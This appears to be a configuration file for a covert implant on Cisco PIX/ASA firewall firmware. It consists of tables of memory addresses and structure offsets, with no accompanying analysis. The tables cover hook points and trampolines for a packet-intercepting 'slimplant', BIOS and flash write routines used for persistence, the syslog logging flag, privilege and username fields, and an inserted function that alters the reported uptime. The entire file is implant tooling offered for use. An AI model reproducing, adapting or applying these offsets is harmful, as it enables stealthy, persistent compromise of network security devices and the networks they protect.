; --- SECTION I ---
;
0x10080400            // pix version
0x72e000              // address of implant configuration
0x0   0x00d86a98      // allocb
0x1   0x00d863c8      // freeb
0x2   0x0011a950      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x006f4700      // ip_put
0x4   0x0011aad0      // close
0x5   0x01316a78      // atoip
0x6   0x01301118      // memset
0x7   0x01316aa8      // memmove
0x8   0x00d86188      // malloc_call_calloc
0x9   0x01301648      // free
0xa   0x01300848      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x00000068      // metaframe offset in block structure
0xe   0x00000084      // interface semiphore in metaframe
0xf   0x0130d828      // rand
0x15  0x001179d0      // process_create
0x16  0x00118c00      // process_suspend
0x17  0x00119120      // process_sleep_for
0x18  0x00ae7be8      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x01656fd0      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x006f7b60      // calc_ip_cksum
0x21  0x006f8ed0      // arp_loopkup
0x22  0x006f6ed0      // set_block_hdr_mac_and_proto
0x23  0x0070b990      // get hardware interface
0x24  0x00a25b48      // get next hop
0x25  0x00a25de8      // get route
0x26  0x006f2540      // send_it
0x27  0x006fb2d0      // arp_create
0x28  0x00b54178      // get_hw_iface_2
0x2a  0x3c            // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2e  0x000001ac      // offset from cur_t that contains the current context number
0x2f  0x015c96b0      // pointer to channnel list
0x30  0x014a0df8      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x015d6090      // max number of interface cards
0x35  0x01656660      // internal_clock
0x36  0x00b51bf8      // get_interface_mac
0x37  0x00000153      // offset to hardware interface number in interface struct
0x38  0x10            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000424      // offset to send channel in channel list
0x3b  0x0061bcc0      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x0061bdc0      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x0061b1c0      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x0061bbc0      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000018      // offset to next IP fragment pointer in block
0x40  0x01679ad0      // address of context list
0x42  0x013115ad      // checkheaps checksum location
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x008ebc92      // address of our hook point
HookedCall                0x008efac8      // called function being hooked
JmpLocation               0x009421ca      // empty area to jump to
InterfaceAddr             0x014a0df8      // same as 0x30 above
InterfaceLeng             0x00000218      // length of interface struct
IntSecurityOffset         0x1c            // security level field offset
IntNameOffset             0x000001e8      // interface name field offset
IntNumOffset              0x00000153      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x20            // ip address offset in the interface struct
IntNetmaskOffset          0x24            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0x0165e6c0      // addr of crypto structure
ArpTableAddrPtr           0x014900d8      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x0166af80      // addr of the bios class structure
BiosWriteAddr1            0x005141a8      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x005170c8      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x005169e8      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x00517b18      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x0061c9c0      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress      0x0146225f      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x00502908      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x01461ed2      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x005025e8      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x0061c000      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x0061ccb0      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x0061c4f0      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x0061c670      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x0061dbf0      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x013082f8      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0x016d6dd0      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x0011a6d0      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x013e42d8      // addr of duart/0 tty entry
CIStartFunc               0x0018e710      // addr of the command interface start function -- telnet function
CommandListAddr           0x014c6ab8      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x015913f0      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x013129a8      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x017d4f28      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0x84            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0x88            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0x90            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000b38      // offset into the syslog structure where the logging level is stored
Open                      0x0011a950      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x08            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x013b105c      // Address where the thread timeout value is stored 
UpTimeCounter             0x01656660      // Address of the up time counter
Display_uptime_addr       0x00199800      // Address of the function that display the uptime
Inserted_code_addr        0x001ae394      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x011f3c08      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x011f3a58      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x0018ebca      // Address of hook into the command interface
AvailMemoryPtr            0x01657560      // Address of total available memory
;
srand               0x0130d888
BN_new              0x0123f488 //BIGNUM library functions
BN_free             0x0123f3e8
BN_mod_exp          0x012801c8
BN_CTX_new          0x01266df8
BN_CTX_free         0x012670a8
BN_bin2bn           0x01240248
BN_bn2bin           0x0123fd18
BN_bn2hex           0x01272538
BN_num_bits         0x0123fbb8
DH_p                0x013c8780 //DiffieHelman large prime
aesEncrypt          0x001b9c80 //AES encrypt/decrypt function
aesKeySet           0x001b4d20 //AES key schedule function.  Search for (aesKeySched)
slimHookAddr        0x008ec7fb //Packet hook for slimplant
slimTrampoline      0x0011c672 //trampoline for slimplant
HookByte1           0x8b
HookBytes2to5       0xff85687b
InterfaceOffset     0x0000000c
codepageBase        0x01656eb0
codeSectionStart    0x00100000
codeSectionEnd      0x013af820
;
; --- END OF SECTION II ---
;
:EOS:
;
